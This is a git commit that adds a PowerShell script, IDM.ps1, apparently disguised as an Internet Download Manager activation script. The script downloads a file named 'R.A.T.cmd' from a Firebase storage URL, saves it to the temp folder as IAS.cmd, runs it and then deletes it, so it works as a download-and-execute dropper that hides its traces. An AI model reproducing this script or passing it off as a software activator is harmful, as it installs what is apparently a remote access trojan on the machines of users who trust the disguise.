9ace40ea7c2d58fe92ed304a93e4b22e94c2a04c
Vivek Ravindra Deshmukh <123163786+Github7K@users.noreply.github.com>
2023-11-08 14:28:13 +0500

    Add files via upload

---
+++ IDM.ps1
@@ -0,0 +1,19 @@
+# Enable TLSv1.2 for compatibility with older clients
+[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor [System.Net.SecurityProtocolType]::Tls12
+
+$DownloadURL = 'https://firebasestorage.googleapis.com/v0/b/minimene-a8522.appspot.com/o/R.A.T.cmd?alt=media&token=3c96b2a6-d81e-4766-9b4b-2f62ac9d0d70'
+
+$FilePath = "$env:TEMP\IAS.cmd"
+
+try {
+    Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing -OutFile $FilePath
+} catch {
+    Write-Error $_
+	Return
+}
+
+if (Test-Path $FilePath) {
+    Start-Process $FilePath -Wait
+    $item = Get-Item -LiteralPath $FilePath
+    $item.Delete()
+}
